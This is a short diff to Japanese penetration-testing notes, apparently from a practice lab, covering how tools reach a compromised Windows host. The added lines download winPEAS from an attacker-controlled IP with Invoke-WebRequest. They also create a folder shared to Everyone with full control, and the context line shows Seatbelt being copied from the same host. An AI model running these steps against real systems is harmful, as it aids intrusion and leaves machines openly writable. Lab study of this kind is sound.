@@ -28,7 +28,20 @@ cp \\192.168.49.104\share\Seatbelt.exe .
 
 ### 転送・実行
 
-listenrがうまくいかないので、base64 encodeして強制的に転送する
+listenrがうまくいかないので、base64 encodeして強制的に転送しようとしたけど無理だったので、WK26でshareを作成
+```powershell
+Invoke-WebRequest -Uri http://192.168.49.104:443/winPEASx64.exe -Outfile .\WinPEASx64.exe
+
+# フォルダの作成
+mkdir C:\PublicShare
+
+# 共有の設定（Everyoneにフルコントロールを付与）
+net share Transfer=C:\PublicShare /grant:Everyone,FULL
+
+# フォルダ自体の権限をEveryoneフルコントロールに
+icacls C:\PublicShare /grant "Everyone:(OI)(CI)F" /T
+```
+
 
 ### 実行結果抽出
 
